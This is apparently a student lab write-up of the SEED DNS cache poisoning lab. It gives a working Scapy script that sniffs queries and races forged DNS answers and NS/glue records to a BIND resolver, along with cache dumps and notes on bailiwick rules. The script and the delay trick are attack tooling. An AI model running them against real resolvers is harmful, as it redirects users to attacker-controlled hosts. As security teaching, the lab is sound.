# DNS Cache Poisoning

This module demonstrates DNS cache poisoning techniques using Scapy inside a Dockerized lab environment. Attacks are performed against a local BIND resolver to show how crafted DNS responses can corrupt a resolver's cache and redirect all users of that resolver.

> **Source:** SEED Labs — Local DNS Attack Lab (Wenliang Du)

## Lab Environment

Four containers on `10.9.0.0/24`:

| Host | IP | Role |
|---|---|---|
| Attacker | `10.9.0.1` | Runs sniff-and-spoof scripts |
| User | `10.9.0.5` | Sends DNS queries |
| Local DNS Server | `10.9.0.53` | BIND9 resolver (source port fixed to `33333`, DNSSEC disabled) |
| Attacker's Nameserver | `10.9.0.153` | Hosts `attacker32.com` and a fake `example.com` zone |

The attacker's script sniffs DNS queries on the Docker bridge interface and races a forged reply back to the resolver before the legitimate upstream answer arrives.

## Environment Setup

BIND must be configured to forward queries upstream so it can resolve external names. Add this block to `/etc/bind/named.conf.options` inside the DNS server container:

```text
options {
    forwarders { 8.8.8.8; 1.1.1.1; };
    forward only;
};
```

Verify the lab is configured correctly from the User container:

```bash
# Should return the IP from attacker32.com.zone
dig ns.attacker32.com

# Should return the official IP for www.example.com
dig www.example.com

# Should return the attacker's fake IP
dig @ns.attacker32.com www.example.com
```

## Core Spoofing Script

All tasks build on the same `dns_sniff_spoof.py` script. It sniffs UDP port 53, detects queries for `www.example.com`, and sends back a forged DNS response with controlled Answer, Authority, and Additional sections:

```python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer: redirect www.example.com to attacker IP
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5')

        # Authority: point example.com NS to attacker nameserver
        NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')

        # Additional: glue record for the fake NS
        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=1, arcount=1,
                     an=Anssec, ns=NSsec1, ar=Addsec1)

        send(IPpkt / UDPpkt / DNSpkt)

sniff(iface='br-423615029db2', filter='udp and dst port 53', prn=spoof_dns)
```

## Useful Commands

```bash
# On DNS server — clear resolver cache before each task
rndc flush

# On user — trigger a DNS query
dig www.example.com

# On DNS server — inspect cached records after attack
rndc dumpdb -cache
cat /var/cache/bind/dump.db
```

> If the spoofed packet consistently arrives after the real reply, add network delay on the router to slow the legitimate response:
> ```bash
> tc qdisc add dev eth0 root netem delay 100ms
> ```

---

## Task 1 — Directly Spoofing Response to User

Write a program that sniffs DNS queries for `www.example.com` and immediately sends a forged DNS reply to the **user machine** before the legitimate reply arrives. Compare results before and after the attack. Clear the local DNS cache before each test.

*Observation:* Direct spoofing requires winning the timing race on every query. Because the upstream response is typically fast, the attack has limited persistence — it only corrupts a single lookup at a time.

---

## Task 2 — DNS Cache Poisoning — Spoofing Answers

Shift the target from the user to the **local DNS server**. Modify the attack to send the forged response to the resolver instead. A successful attack causes the resolver to cache `www.example.com → 10.0.2.5`.

1. Flush the cache: `rndc flush`
2. Run the attack while issuing `dig www.example.com` from the user container.
3. Verify the cache: `rndc dumpdb -cache && cat /var/cache/bind/dump.db`

*Cache dump confirms:*
```
www.example.com.   863989   IN A   10.0.2.5
```

*Observation:* Poisoning the cache has a persistent effect. All users of the resolver are affected until the TTL expires — not just the next query.

---

## Task 3 — Spoofing NS Records (Same Zone)

Extend the attack to inject a forged NS record in the Authority section, installing the attacker's nameserver as the authority for the entire `example.com` zone.

Target Authority section:
```
example.com.  259200  IN  NS  ns.attacker32.com.
```

With a glue record in Additional:
```
ns.attacker32.com.  259200  IN  A  10.9.0.153
```

Verify the NS record appears in the DNS cache and confirm that future queries for any hostname under `example.com` resolve through the attacker's nameserver.

*Cache dump shows:*
```
example.com.          NS   ns.attacker32.com.
ns.attacker32.com.    IN A  10.9.0.153
```

*Observation:* Poisoning an NS record gives the attacker control over an entire zone, not just a single hostname.

---

## Task 4 — Spoofing NS Records for Another Domain

Add a second NS record to the Authority section attempting to also delegate `google.com` to the attacker's nameserver alongside the `example.com` record:

```
;; AUTHORITY SECTION:
example.com.  259200  IN  NS  ns.attacker32.com.
google.com.   259200  IN  NS  ns.attacker32.com.
```

Check the DNS cache after the attack and explain which records were cached and which were not.

*Observation:* Modern resolvers enforce **bailiwick rules** — they validate authority data and refuse to cache NS records for domains outside the queried zone. The `google.com` NS entry is silently discarded; only the `example.com` record is accepted.

---

## Task 5 — Spoofing Records in the Additional Section

Include both legitimate glue records and an unrelated record in the Additional section when responding to a `www.example.com` query:

```
;; AUTHORITY SECTION:
example.com.  259200  IN  NS  ns.attacker32.com.
example.com.  259200  IN  NS  ns.example.com.

;; ADDITIONAL SECTION:
ns.attacker32.com.  259200  IN  A  1.2.3.4
ns.example.com.     259200  IN  A  5.6.7.8
www.facebook.com.   259200  IN  A  3.4.5.6
```

Report which entries are cached and which are not. Explain why `www.facebook.com` is or is not accepted.

*Cache dump shows:*
```
ns.attacker32.com.   IN A   1.2.3.4
ns.example.com.      IN A   5.6.7.8
example.com.         NS     ns.example.com.
                     NS     ns.attacker32.com.
www.example.com.     IN A   10.0.2.5
```

The `www.facebook.com` record is **not** cached.

*Observation:* Resolvers cache glue records only when the corresponding NS is in the Authority section of the same response. Additional records for unrelated domains are silently discarded.

---

## Conclusion

Direct spoofing affects a single query but requires winning the race every time. Cache poisoning has lasting impact because the forged records persist until TTL expiry and affect all users of the resolver. However, modern resolvers enforce bailiwick rules — authority and glue records are only cached for zones directly related to the queried name — which limits cross-domain poisoning attempts.

---
